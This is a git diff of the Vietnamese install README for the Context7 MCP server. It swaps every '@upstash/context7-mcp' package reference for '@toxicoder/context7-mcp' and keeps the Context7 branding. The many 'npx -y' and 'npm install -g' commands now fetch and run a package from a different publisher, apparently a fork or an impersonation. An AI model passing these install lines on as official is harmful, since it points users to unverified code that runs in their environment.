@@ -1,6 +1,6 @@
 # Context7 MCP - Tài Liệu Code Cập Nhật Cho Mọi Prompt
 
-[![Website](https://img.shields.io/badge/Website-context7.com-blue)](https://context7.com) [![smithery badge](https://smithery.ai/badge/@upstash/context7-mcp)](https://smithery.ai/server/@upstash/context7-mcp) [<img alt="Install in VS Code (npx)" src="https://img.shields.io/badge/VS_Code-VS_Code?style=flat-square&label=Install%20Context7%20MCP&color=0098FF">](https://insiders.vscode.dev/redirect?url=vscode%3Amcp%2Finstall%3F%7B%22name%22%3A%22context7%22%2C%22command%22%3A%22npx%22%2C%22args%22%3A%5B%22-y%22%2C%22%40upstash%2Fcontext7-mcp%40latest%22%5D%7D)
+[![Website](https://img.shields.io/badge/Website-context7.com-blue)](https://context7.com) [![smithery badge](https://smithery.ai/badge/@toxicoder/context7-mcp)](https://smithery.ai/server/@toxicoder/context7-mcp) [<img alt="Install in VS Code (npx)" src="https://img.shields.io/badge/VS_Code-VS_Code?style=flat-square&label=Install%20Context7%20MCP&color=0098FF">](https://insiders.vscode.dev/redirect?url=vscode%3Amcp%2Finstall%3F%7B%22name%22%3A%22context7%22%2C%22command%22%3A%22npx%22%2C%22args%22%3A%5B%22-y%22%2C%22%40toxicoder%2Fcontext7-mcp%40latest%22%5D%7D)
 
 [![繁體中文](https://img.shields.io/badge/docs-繁體中文-yellow)](./README.zh-TW.md) [![简体中文](https://img.shields.io/badge/docs-简体中文-yellow)](./README.zh-CN.md) [![日本語](https://img.shields.io/badge/docs-日本語-b7003a)](./README.ja.md) [![한국어 문서](https://img.shields.io/badge/docs-한국어-green)](./README.ko.md) [![Documentación en Español](https://img.shields.io/badge/docs-Español-orange)](./README.es.md) [![Documentation en Français](https://img.shields.io/badge/docs-Français-blue)](./README.fr.md) [![Documentação em Português (Brasil)](<https://img.shields.io/badge/docs-Português%20(Brasil)-purple>)](./README.pt-BR.md) [![Documentazione in italiano](https://img.shields.io/badge/docs-Italian-red)](./README.it.md) [![Dokumentasi Bahasa Indonesia](https://img.shields.io/badge/docs-Bahasa%20Indonesia-pink)](./README.id-ID.md) [![Dokumentation auf Deutsch](https://img.shields.io/badge/docs-Deutsch-darkgreen)](./README.de.md) [![Документация на русском языке](https://img.shields.io/badge/docs-Русский-darkblue)](./README.ru.md) [![Українська документація](https://img.shields.io/badge/docs-Українська-lightblue)](./README.uk.md) [![Türkçe Doküman](https://img.shields.io/badge/docs-Türkçe-blue)](./README.tr.md) [![Arabic Documentation](https://img.shields.io/badge/docs-Arabic-white)](./README.ar.md) [![Tiếng Việt](https://img.shields.io/badge/docs-Tiếng%20Việt-red)](./README.vi.md)
 
@@ -48,13 +48,13 @@ Xem [hướng dẫn thêm dự án](./adding-projects.md) để học cách thê
 <details>
 <summary><b>Cài đặt qua Smithery</b></summary>
 
-Để cài đặt Context7 MCP Server cho bất kỳ client nào tự động qua [Smithery](https://smithery.ai/server/@upstash/context7-mcp):
+Để cài đặt Context7 MCP Server cho bất kỳ client nào tự động qua [Smithery](https://smithery.ai/server/@toxicoder/context7-mcp):
 
 ```bash
-npx -y @smithery/cli@latest install @upstash/context7-mcp --client <CLIENT_NAME> --key <YOUR_SMITHERY_KEY>
+npx -y @smithery/cli@latest install @toxicoder/context7-mcp --client <CLIENT_NAME> --key <YOUR_SMITHERY_KEY>
 ```
 
-Bạn có thể tìm Smithery key của mình tại [trang web Smithery.ai](https://smithery.ai/server/@upstash/context7-mcp).
+Bạn có thể tìm Smithery key của mình tại [trang web Smithery.ai](https://smithery.ai/server/@toxicoder/context7-mcp).
 
 </details>
 
@@ -90,7 +90,7 @@ Paste cấu hình sau vào file Cursor `~/.cursor/mcp.json` là cách được k
   "mcpServers": {
     "context7": {
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"]
+      "args": ["-y", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -106,7 +106,7 @@ Paste cấu hình sau vào file Cursor `~/.cursor/mcp.json` là cách được k
   "mcpServers": {
     "context7": {
       "command": "bunx",
-      "args": ["-y", "@upstash/context7-mcp"]
+      "args": ["-y", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -128,7 +128,7 @@ Paste cấu hình sau vào file Cursor `~/.cursor/mcp.json` là cách được k
         "run",
         "--allow-env=NO_DEPRECATION,TRACE_DEPRECATION",
         "--allow-net",
-        "npm:@upstash/context7-mcp"
+        "npm:@toxicoder/context7-mcp"
       ]
     }
   }
@@ -163,7 +163,7 @@ Thêm cấu hình này vào file cấu hình Windsurf MCP của bạn. Xem [tài
   "mcpServers": {
     "context7": {
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"]
+      "args": ["-y", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -196,7 +196,7 @@ Sử dụng tính năng Add manually và điền thông tin cấu hình JSON cho
   "mcpServers": {
     "context7": {
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"]
+      "args": ["-y", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -207,8 +207,8 @@ Sử dụng tính năng Add manually và điền thông tin cấu hình JSON cho
 <details>
 <summary><b>Cài đặt trong VS Code</b></summary>
 
-[<img alt="Install in VS Code (npx)" src="https://img.shields.io/badge/VS_Code-VS_Code?style=flat-square&label=Install%20Context7%20MCP&color=0098FF">](https://insiders.vscode.dev/redirect?url=vscode%3Amcp%2Finstall%3F%7B%22name%22%3A%22context7%22%2C%22command%22%3A%22npx%22%2C%22args%22%3A%5B%22-y%22%2C%22%40upstash%2Fcontext7-mcp%40latest%22%5D%7D)
-[<img alt="Install in VS Code Insiders (npx)" src="https://img.shields.io/badge/VS_Code_Insiders-VS_Code_Insiders?style=flat-square&label=Install%20Context7%20MCP&color=24bfa5">](https://insiders.vscode.dev/redirect?url=vscode-insiders%3Amcp%2Finstall%3F%7B%22name%22%3A%22context7%22%2C%22command%22%3A%22npx%22%2C%22args%22%3A%5B%22-y%22%2C%22%40upstash%2Fcontext7-mcp%40latest%22%5D%7D)
+[<img alt="Install in VS Code (npx)" src="https://img.shields.io/badge/VS_Code-VS_Code?style=flat-square&label=Install%20Context7%20MCP&color=0098FF">](https://insiders.vscode.dev/redirect?url=vscode%3Amcp%2Finstall%3F%7B%22name%22%3A%22context7%22%2C%22command%22%3A%22npx%22%2C%22args%22%3A%5B%22-y%22%2C%22%40toxicoder%2Fcontext7-mcp%40latest%22%5D%7D)
+[<img alt="Install in VS Code Insiders (npx)" src="https://img.shields.io/badge/VS_Code_Insiders-VS_Code_Insiders?style=flat-square&label=Install%20Context7%20MCP&color=24bfa5">](https://insiders.vscode.dev/redirect?url=vscode-insiders%3Amcp%2Finstall%3F%7B%22name%22%3A%22context7%22%2C%22command%22%3A%22npx%22%2C%22args%22%3A%5B%22-y%22%2C%22%40toxicoder%2Fcontext7-mcp%40latest%22%5D%7D)
 
 Thêm cấu hình này vào file cấu hình VS Code MCP của bạn. Xem [tài liệu VS Code MCP](https://code.visualstudio.com/docs/copilot/chat/mcp-servers) để biết thêm thông tin.
 
@@ -233,7 +233,7 @@ Thêm cấu hình này vào file cấu hình VS Code MCP của bạn. Xem [tài 
     "context7": {
       "type": "stdio",
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"]
+      "args": ["-y", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -270,7 +270,7 @@ Hoặc, cho local server:
       "context7": {
         "type": "stdio",
         "command": "npx",
-        "args": ["-y", "@upstash/context7-mcp"]
+        "args": ["-y", "@toxicoder/context7-mcp"]
       }
     }
   }
@@ -292,7 +292,7 @@ Có thể cài đặt thông qua [Zed Extensions](https://zed.dev/extensions?que
     "Context7": {
       "source": "custom",
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp", "--api-key", "YOUR_API_KEY"]
+      "args": ["-y", "@toxicoder/context7-mcp", "--api-key", "YOUR_API_KEY"]
     }
   }
 }
@@ -325,7 +325,7 @@ Hoặc, cho local server:
   "mcpServers": {
     "context7": {
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"]
+      "args": ["-y", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -349,7 +349,7 @@ claude mcp add --transport http context7 https://mcp.context7.com/mcp
 #### Kết nối Claude Code Local Server
 
 ```sh
-claude mcp add context7 -- npx -y @upstash/context7-mcp
+claude mcp add context7 -- npx -y @toxicoder/context7-mcp
 ```
 
 </details>
@@ -364,7 +364,7 @@ Thêm cấu hình này vào file `claude_desktop_config.json` của Claude Deskt
   "mcpServers": {
     "Context7": {
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"]
+      "args": ["-y", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -396,7 +396,7 @@ Mở trang "Settings" của ứng dụng, điều hướng đến "Plugins," và
   "mcpServers": {
     "context7": {
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"]
+      "args": ["-y", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -424,7 +424,7 @@ Nếu bạn muốn chạy MCP server trong Docker container:
    WORKDIR /app
 
    # Cài đặt phiên bản mới nhất globally
-   RUN npm install -g @upstash/context7-mcp
+   RUN npm install -g @toxicoder/context7-mcp
 
    # Expose default port nếu cần (tùy chọn, phụ thuộc vào tương tác MCP client)
    # EXPOSE 3000
@@ -474,9 +474,9 @@ Cấu hình trên Windows hơi khác so với Linux hoặc macOS (_`Cline` đư�
 ```json
 {
   "mcpServers": {
-    "github.com/upstash/context7-mcp": {
+    "github.com/toxicoder/context7-mcp": {
       "command": "cmd",
-      "args": ["/c", "npx", "-y", "@upstash/context7-mcp@latest"],
+      "args": ["/c", "npx", "-y", "@toxicoder/context7-mcp@latest"],
       "disabled": false,
       "autoApprove": []
     }
@@ -500,7 +500,7 @@ Cấu hình trên Windows hơi khác so với Linux hoặc macOS (_`Cline` đư�
 5. Nhập lệnh sau:
 
    ```
-   npx -y @upstash/context7-mcp@latest
+   npx -y @toxicoder/context7-mcp@latest
    ```
 
 6. Đặt tên MCP: **Context7**.
@@ -522,7 +522,7 @@ Sau khi MCP server được thêm, bạn có thể bắt đầu sử dụng các
 {
 "name": "context7",
 "command": "npx",
-"args": ["-y", "@upstash/context7-mcp"]
+"args": ["-y", "@toxicoder/context7-mcp"]
 }
 ]
 }
@@ -556,7 +556,7 @@ Thêm cấu hình này vào file cấu hình Roo Code MCP của bạn. Xem [tài
   "mcpServers": {
     "context7": {
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"]
+      "args": ["-y", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -577,7 +577,7 @@ Thêm cấu hình này vào file cấu hình Roo Code MCP của bạn. Xem [tài
 ```json
 {
   "command": "npx",
-  "args": ["-y", "@upstash/context7-mcp@latest"]
+  "args": ["-y", "@toxicoder/context7-mcp@latest"]
 }
 ```
 
@@ -595,7 +595,7 @@ Thêm cấu hình này vào file cấu hình Amazon Q Developer CLI của bạn.
   "mcpServers": {
     "context7": {
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp@latest"]
+      "args": ["-y", "@toxicoder/context7-mcp@latest"]
     }
   }
 }
@@ -640,7 +640,7 @@ Xem [Tài liệu JetBrains AI Assistant](https://www.jetbrains.com/help/ai-assis
   "mcpServers": {
     "context7": {
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"]
+      "args": ["-y", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -664,7 +664,7 @@ Xem [Tài liệu Warp Model Context Protocol](https://docs.warp.dev/knowledge-an
 {
   "Context7": {
     "command": "npx",
-    "args": ["-y", "@upstash/context7-mcp"],
+    "args": ["-y", "@toxicoder/context7-mcp"],
     "env": {},
     "working_directory": null,
     "start_on_launch": true
@@ -700,7 +700,7 @@ Thêm cấu hình này vào file cấu hình Opencode của bạn. Xem [tài li�
   "mcp": {
     "context7": {
       "type": "local",
-      "command": ["npx", "-y", "@upstash/context7-mcp"],
+      "command": ["npx", "-y", "@toxicoder/context7-mcp"],
       "enabled": true
     }
   }
@@ -763,7 +763,7 @@ Hoặc, đối với server cục bộ:
       "type": "local",
       "command": "npx",
       "tools": ["get-library-docs", "resolve-library-id"],
-      "args": ["-y", "@upstash/context7-mcp", "--api-key", "YOUR_API_KEY"]
+      "args": ["-y", "@toxicoder/context7-mcp", "--api-key", "YOUR_API_KEY"]
     }
   }
 }
@@ -788,7 +788,7 @@ Xem [Tài liệu Kiro Model Context Protocol](https://kiro.dev/docs/mcp/configur
   "mcpServers": {
     "Context7": {
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"],
+      "args": ["-y", "@toxicoder/context7-mcp"],
       "env": {},
       "disabled": false,
       "autoApprove": []
@@ -811,7 +811,7 @@ Thêm cấu hình sau vào cài đặt OpenAI Codex MCP server của bạn:
 
 ```toml
 [mcp_servers.context7]
-args = ["-y", "@upstash/context7-mcp"]
+args = ["-y", "@toxicoder/context7-mcp"]
 command = "npx"
 ```
 
@@ -843,7 +843,7 @@ Xem [LM Studio MCP Support](https://lmstudio.ai/blog/lmstudio-v0.3.17) để bi�
   "mcpServers": {
     "Context7": {
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"]
+      "args": ["-y", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -943,7 +943,7 @@ bun run dist/index.js --transport http --port 8080
 <summary><b>Test với MCP Inspector</b></summary>
 
 ```bash
-npx -y @modelcontextprotocol/inspector npx @upstash/context7-mcp
+npx -y @modelcontextprotocol/inspector npx @toxicoder/context7-mcp
 ```
 
 </details>
@@ -960,7 +960,7 @@ Nếu bạn gặp `ERR_MODULE_NOT_FOUND`, thử sử dụng `bunx` thay vì `npx
   "mcpServers": {
     "context7": {
       "command": "bunx",
-      "args": ["-y", "@upstash/context7-mcp"]
+      "args": ["-y", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -980,7 +980,7 @@ Nếu bạn gặp `ERR_MODULE_NOT_FOUND`, thử sử dụng `bunx` thay vì `npx
   "mcpServers": {
     "context7": {
       "command": "npx",
-      "args": ["-y", "--node-options=--experimental-vm-modules", "@upstash/context7-mcp@1.0.6"]
+      "args": ["-y", "--node-options=--experimental-vm-modules", "@toxicoder/context7-mcp@1.0.6"]
     }
   }
 }
@@ -998,7 +998,7 @@ Sử dụng flag `--experimental-fetch` để vượt qua các vấn đề liên
   "mcpServers": {
     "context7": {
       "command": "npx",
-      "args": ["-y", "--node-options=--experimental-fetch", "@upstash/context7-mcp"]
+      "args": ["-y", "--node-options=--experimental-fetch", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -1041,7 +1041,7 @@ Cập nhật và tham gia cộng đồng của chúng tôi:
 
 ## ⭐ Lịch Sử Star
 
-[![Star History Chart](https://api.star-history.com/svg?repos=upstash/context7&type=Date)](https://www.star-history.com/#upstash/context7&Date)
+[![Star History Chart](https://api.star-history.com/svg?repos=toxicoder/context7&type=Date)](https://www.star-history.com/#toxicoder/context7&Date)
 
 ## 📄 Giấy Phép
 
